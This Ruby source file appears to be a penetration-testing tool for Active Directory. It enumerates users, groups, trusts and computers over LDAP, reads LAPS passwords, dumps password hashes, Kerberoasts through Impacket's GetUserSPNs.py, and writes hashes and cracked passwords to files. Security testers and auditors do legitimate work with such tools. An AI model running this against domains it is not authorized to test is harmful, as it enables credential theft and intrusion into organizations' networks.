#!/usr/bin/env ruby
# frozen_string_literal: true

# written by Aidan Damerell - 2023
$VERBOSE = nil # This just prevent certificate errors being thrown if we connect to a LDAPS server using the IP address

# Standard Library
require 'io/console'
require 'yaml'
require 'resolv'
require 'pry'

# Let Bundler load our deps and check for the correct version
require 'bundler/setup'
Bundler.require

# Load in our custom objects and functions.
require_relative './objects'
require_relative './generic_tasks'

banner = <<~EOF
    __#{'               '}
   (     _// '_ /_/_
  __)/)()/(_/(//)/#{'  '}
    /       _/
  V1.0 : LED
EOF

opts = Optimist.options do
  opt :host,
      'Domain Controller IP / Hostname'.bold, type: :string, short: '-h'
  opt :username,
      'Domain Username'.bold, type: :string, short: '-u'
  opt :user_dn,
      'Use a DN rather than username and domain', type: :string
  opt :password,
      'Domain Password'.bold, type: :string, short: '-p'
  opt :domain,
      'Domain Name'.bold, type: :string, short: '-d'
  opt :all,
      'Do Everything', type: :boolean, short: '-A'
  opt :queryuser,
      'Query a single user', type: :string
  opt :querygroup,
      'Query a single group', type: :string, short: '-q'
  opt :admingroups,
      'Enumerate common administrative groups', type: :boolean
  opt :enumtrusts,
      'Enumerate Active Directory trusts', type: :boolean, short: '-t'
  opt :usersandgroups,
      'Enumerate all users and groups in the domain', type: :boolean, short: '-b'
  opt :hashdump,
      'Dump the groups user hashes, requires privs', type: :boolean, short: '-H'
  opt :computers,
      'Dump all domain-joined machines (options: all, workstations, servers, domaincontrollers)', type: :string, short: '-c'
  opt :output,
      'Output the datastores (Domain,Users,Groups,Computer) to excel', type: :boolean, short: '-o'
  opt :restore,
      'Restore from YAML log file', type: :string, short: '-r'
  opt :external,
      'List of usernames from external OSINT', type: :string
  opt :externalformat,
      'Attribute to use for external username matches (options: samaccountname, email_address, username)', type: :string
  opt :kerberoast,
      'Kerberoast the domain', type: :boolean, short: '-k'
  opt :noresolve,
      "Don't Resolve DNS Names", type: :boolean, short: '-R'
  opt :cracked,
      'A list of cracked credentials from which to add to the users output', type: :string
  opt :redacted,
      'Redact the output AND YAML', type: :boolean
  opt :fqdn,
      'Manually override the FQDN, E.G. DC=some,DC=domain,DC=com', type: :string
  opt :rawldap,
      'Run a custom LDAP query', type: :string
  opt :verbose,
      'Dump RAW LDAP Output', type: :boolean
end

if opts[:all]
  opts[:usersandgroups] = true
  opts[:hashdump]       = true
  opts[:computers]      = 'all'
  opts[:kerberoast]     = true
end

puts banner.light_blue
UAC.load

def build_ldap_connection(type, host, username, password, dn, domain)
  config = {
    host: host,
    auth: {
      method: :simple,
      password: password
    }
  }

  if type == :ldap_ssl
    config[:port] = 636
    config[:encryption] = {
      method: :simple_tls,
      tls_options: { verify_mode: OpenSSL::SSL::VERIFY_NONE }
    }
  elsif type == :ldap_plain
    config[:port] = 389
  end

  config[:auth][:username] = (dn || "#{domain}\\#{username}")

  Net::LDAP.new(config)
end

if opts[:password].nil? && opts[:restore].nil?
  print 'Password:'
  opts[:password] = $stdin.noecho(&:gets).chomp
end

if !opts[:restore]
  begin
    ldap_con = build_ldap_connection(:ldap_ssl, opts[:host], opts[:username], opts[:password], opts[:user_dn],
                                     opts[:domain])

    raise Net::LDAP::Error unless ldap_con.bind
  rescue Net::LDAP::Error, Errno::ECONNREFUSED => e
    puts "Unable to connect over LDAPS, Reason: #{e}".yellow
    puts 'Would you like to use insecure LDAP? Y/N'.yellow
    print 'Choice:'.light_blue
    if gets.chomp.downcase == 'y'
      ldap_con = build_ldap_connection(:ldap_plain, opts[:host], opts[:username], opts[:password], opts[:user_dn],
                                       opts[:domain])
    else
      puts 'Cancelling'.green
      exit
    end

    ldap_con.authenticate(opts[:user_dn], opts[:password]) if opts[:user_dn]
  end

  begin
    # Check that the connection bound to LDAP
    if ldap_con.bind
      puts "[+] LDAP connection successful with user: #{opts[:user_dn] || opts[:username]}\n".green
    else
      puts "[-] Hmm, unable to connect to authenticate: #{ldap_con.get_operation_result.message}".red
      exit
    end
  rescue Net::LDAP::Error => e
    puts "[-] Hmm, unable to connect to LDAP/LDAPS #{e}".red
    exit
  end

  begin
    # Get the naming context for the domain
    puts "Querying RootDSE for FQDN...\n".green
    naming_context = []
    ldap_con.search_root_dse.namingcontexts.each_with_index do |context, index|
      naming_context[index] = a_context = context.to_s
      if a_context.split(',')[0] =~ /#{opts[:domain]}/i
        puts "[#{index}] #{a_context}".green
        @treebase = a_context
      else
        puts "[#{index}] #{a_context}".red
      end
    end
    # Check the treebase was set and if not query the user for it
    if opts[:fqdn]
      puts "Using Treebase: #{opts[:fqdn]}".green
      @treebase = opts[:fqdn]
      @fqdn = @treebase.gsub(',DC=', '.').sub('DC=', '')
    elsif @treebase
      puts "\nTreebase found: #{@treebase}".green
      # create a FQDN from the treebase to use in kerberoasting and hashdumping
      @fqdn = @treebase.gsub(',DC=', '.').sub('DC=', '')
      puts "FQDN Enumerated: #{@fqdn}".green
    else
      print 'Unable to find, please choose using above numbers:'.yellow
      @treebase = naming_context[gets.chomp.to_i]
      @fqdn = @treebase.gsub(',DC=', '.').sub('DC=', '')
    end
  rescue StandardError => e
    puts "Error: #{e}".red
    puts 'Please check your credentials, exiting'.red
    exit
  end

  puts "Enumerating domain: #{@fqdn}\n".green
  ldap_con.search(base: @treebase, filter: LDAPData.current_domain_info) do |domain|
    current = LDAPData.entry_to_hash(domain)
    current[:current] = true
    LDAPData::Domain.new(current)
    output(LDAPData::Domain.current)
  end
else
  # Logic to repopulate each data object from YAML data
  puts "Reading YAML: #{opts[:restore]}".light_blue
  LDAPData.load_from_restore(opts[:restore])
  puts "Users: #{LDAPData::User.all_users.count}"
  puts "Groups: #{LDAPData::Group.all_groups.count}"
  puts "Computers: #{LDAPData::Computer.all_computers.count}"
  puts "Domains: #{LDAPData::Domain.all_domains.count}"
  @fqdn = LDAPData::Domain.current.fqdn
end

if opts[:rawldap]
  puts "Running custom query: #{opts[:rawldap]}".blue
  ldap_con.search(base: @treebase, filter: opts[:rawldap]) do |output|
    pp output
  end
end
# Get indivual user
if opts[:queryuser]
  puts "Querying user: #{opts[:queryuser]}".green
  puts LDAPData.find_one_user(opts[:queryuser])
  ldap_con.search(base: @treebase, filter: LDAPData.find_one_user(opts[:queryuser])) do |user|
    @user = LDAPData::User.new(LDAPData.entry_to_hash(user))
    p user if opts[:verbose]
    @user.memberof = [] # This is to avoid duplications of data as the User object will use the standard member of, which we dont really want
    ldap_con.search(base: @treebase, filter: LDAPData.recursive_user_memberof(@user.dn)) do |group|
      @user.memberof << LDAPData::Group.new(LDAPData.entry_to_hash(group)).name
    end
  end
  hashdump(type: :single, user: @user, opts: opts) if opts[:hashdump]
  puts "Found user: #{@user.name}".green if @user
  output(@user)
end

# Get individual group
# I'm going to leave out the recursion option here, you're only enumerating one group so it really wont take too long
if opts[:querygroup]
  puts "Querying Group: #{opts[:querygroup]}".green

  ldap_con.search(base: @treebase, filter: LDAPData.find_one_group(opts[:querygroup])) do |group|
    @group         = LDAPData::Group.new(LDAPData.entry_to_hash(group))
    @group.members = []

    ldap_con.search(base: @treebase, filter: LDAPData.recursive_group_memberof(@group.dn)) do |nested|
      @user = LDAPData::User.new(LDAPData.entry_to_hash(nested))
      @group.members << @user.samaccountname
      hashdump(type: :single, user: @user, opts: opts) if opts[:hashdump]
    end
    @group.count = @group.members.count # This value is normally set on initialize so I need to update it
  end

  if @group
    @group.count = @group.members.count
    puts "Found #{@group.members.count} users in group #{@group.name}".green
    output(@group)
  else
    puts "Unable to find group #{opts[:querygroup]}".red
  end
end

# #Get all users
if opts[:usersandgroups]

  opts[:output] = true

  puts "Finding all users in #{@fqdn} domain".green

  ldap_con.search(base: @treebase, filter: LDAPData.find_all_users) do |user|
    LDAPData::User.new(LDAPData.entry_to_hash(user))
  end

  puts "\nFinding all groups in #{@fqdn} domain\n".green

  ldap_con.search(base: @treebase, filter: LDAPData.find_all_groups) do |group|
    @created_group = LDAPData::Group.new(LDAPData.entry_to_hash(group))
    if @created_group.administrative
      puts "--- Running nested enumeration on #{@created_group.name}".green
      @created_group.members = []
      ldap_con.search(base: @treebase, filter: LDAPData.recursive_group_memberof(@created_group.dn)) do |recurse|
        @created_group.members << LDAPData::User.all_users.select { |user| user.dn == recurse.dn }.first
      end
    end
    @created_group.count = @created_group.members.count
  end

  puts "Found Users: #{LDAPData::User.all_users.count}"
  puts "Found Groups: #{LDAPData::Group.all_groups.count}"

  hashdump(type: :full, array: LDAPData::User.all_users, opts: opts) if opts[:hashdump]
end

# #Get domain trusts
if opts[:enumtrusts]
  puts "Finding all domains associated with #{@fqdn}\n".green
  ldap_con.search(base: @treebase, filter: LDAPData.find_domain_trusts) do |domain|
    domain = LDAPData::Domain.new(LDAPData.entry_to_hash(domain))
    output(domain)
  end
end

# Domain computers
if opts[:computers]
  resolver = Resolv::DNS.new(nameserver: [(opts[:host]).to_s])
  puts "Finding computers\n".green
  ldap_con.search(base: @treebase, filter: LDAPData.find_computer(opts[:computers])) do |computer|
    i =  LDAPData.entry_to_hash(computer)
    host = LDAPData::Computer.new(LDAPData.entry_to_hash(computer))
    host.ip = LDAPData::Computer.resolver(resolver, host.dns) unless opts[:noresolve]
    puts "#{host.name} : #{host.ip} : #{host.os} : #{host.os_sp} : #{i[:"ms-mcs-admpwd"]}"
  end
end

# Kerberoast
# Need to add in functionality to check for administrators
if opts[:kerberoast]
  begin
    TTY::Which.which('GetUserSPNs.py')
    output = ''
    cmd = TTY::Command.new(output: output, printer: :quiet)
    # this path is correct in both OSX and Kali
    cmd.run("python /usr/local/bin/GetUserSPNs.py #{@fqdn}/#{opts[:username]}\:\'#{opts[:password]}\' -dc-ip #{opts[:host]} -outputfile #{@fqdn}_kerberoast.txt")
    puts 'Kerberoast completed, written file.'.green if cmd.err.empty?
  rescue NoMethodError
    puts 'Error Dumping Kerberos hashes'.red
  end
end

if opts[:cracked]
  puts "\nLinking Cracked Passwords".green
  LDAPData::User.cracked(File.open(opts[:cracked]))
  puts ''
end
if opts[:external]
  print "\nLinking Externally Found Usernames: ".green
  LDAPData::User.external(File.open(opts[:external]), opts[:externalformat])
  puts ''
end

if opts[:redacted]
  print 'This will remove hashes and passwords from both the excel document AND YAML logs. Continue? Y/N:'.yellow
  LDAPData::User.redact if gets.chomp.downcase == 'y'
end

# Restore functionality, write all object arrays to YAML.
# Only do this if you're not restoring, or if you are - only if you also provide the cracked
# hashes which we can add in.
if !opts[:restore] || opts[:cracked]
  begin
    puts "\nWriting YAML files for logs: #{Time.now.strftime('%Y-%m-%d_%H-%M')}_connection_data.yaml".green
    array = [LDAPData::Group.all_groups, LDAPData::User.all_users, LDAPData::Domain.all_domains,
             LDAPData::Computer.all_computers]
    File.write("./logs/#{Time.now.strftime('%Y-%m-%d_%H-%M')}_connection_data.yaml", array.flatten.to_yaml)
  rescue StandardError
    puts 'Error writing YAML'.red
  end
end

# Excel output
if opts[:output]
  xlsx_object = Axlsx::Package.new
  wb_object   = xlsx_object.workbook
  puts 'writing XLSX output'.green
  swrite(
    wb_object,
    'Users',
    ['Name', 'SamAccountName', 'Email Address', 'UAC Value', 'Description', 'Last Logon', 'When Created', 'Expires',
     'Enabled', 'Time Since bad password', 'Bad Password Count', 'Member Of', 'Hash', 'Hash Type', 'Password', 'Found Externally'],
    LDAPData::User.all_users,
    %i[@name @samaccountname @email_address @uac @description @last_logon @whencreated @accountexpires @enabled
       @badpasswordtime @badpwdcount @memberof @hash @hash_type @password @external]
  )

  swrite(wb_object, 'Groups', %w[Name Members Count DN], LDAPData::Group.all_groups,
         %i[@name @members @count @dn])

  swrite(wb_object, 'Administrative Groups', %w[Name Members Count DN], LDAPData::Group.administrative_groups,
         %i[@name @members @count @dn])
  swrite(wb_object, 'Domains', ['Name', 'Trust Direction', 'Trust Type', 'Trust Attributes', 'Flat name', 'DN'],
         LDAPData::Domain.all_domains, %i[@name @trustdirection @trusttype @trustattributes @flatname @dn])
  swrite(wb_object, 'Computers', ['Name', 'OS', 'OS SP', 'FQDN', 'IP', 'LAPS', 'Last Logon'], LDAPData::Computer.all_computers,
         %i[@name @os @os_sp @dns @ip @laps @last_logon])
  password_policy_output(wb_object, LDAPData::Domain.current)
  if xlsx_object.serialize("#{@fqdn}_output.xlsx")
    puts 'Writing XLSX successful'.green
  else
    puts 'Error writing XLSX'.red
  end
  if opts[:hashdump] || opts[:restore]
    puts "Writing Cracked Hashes: #{@fqdn}_hashdump.txt".green
    File.open("#{@fqdn}_hashdump.txt", 'w+') do |file|
      LDAPData::User.all_users.each do |user|
        next unless user.hash

        file.puts user.hash
      end
    end
    puts "Writing Cracked Hashes (enabled): #{@fqdn}_enabled_hashdump.txt".green
    File.open("#{@fqdn}_enabled_hashdump.txt", 'w+') do |file|
      LDAPData::User.all_users.each do |user|
        next unless user.enabled && user.hash

        file.puts user.hash
      end
    end
    puts "Writing Passwords (enabled): #{@fqdn}_enabled_passwords.txt".green
    File.open("#{@fqdn}_enabled_passwords.txt", 'w+') do |file|
      LDAPData::User.all_users.each do |user|
        next unless user.enabled && user.password

        file.puts user.password
      end
    end
  end
end
